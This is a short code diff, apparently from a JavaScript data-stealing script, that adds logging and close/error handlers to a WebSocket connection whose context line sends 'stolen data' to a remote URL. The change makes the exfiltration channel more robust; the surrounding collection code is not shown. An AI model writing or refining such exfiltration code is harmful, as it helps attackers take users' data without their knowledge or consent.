@@ -25,10 +25,21 @@
         let socket = new WebSocket(WEBSOCKET_URL);
         
         socket.onopen = () => {
+            console.log("WebSocket connection opened.");
             socket.send(JSON.stringify(data)); // Send stolen data over WebSocket
         };
         
-        socket.onerror = (err) => console.error("WebSocket Error:", err);
+        socket.onerror = (err) => {
+            console.error("WebSocket Error:", err);
+        };
+
+        socket.onclose = (event) => {
+            if (event.wasClean) {
+                console.log(`WebSocket connection closed cleanly, code=${event.code}, reason=${event.reason}`);
+            } else {
+                console.error('WebSocket connection died');
+            }
+        };
     }
 
     try {
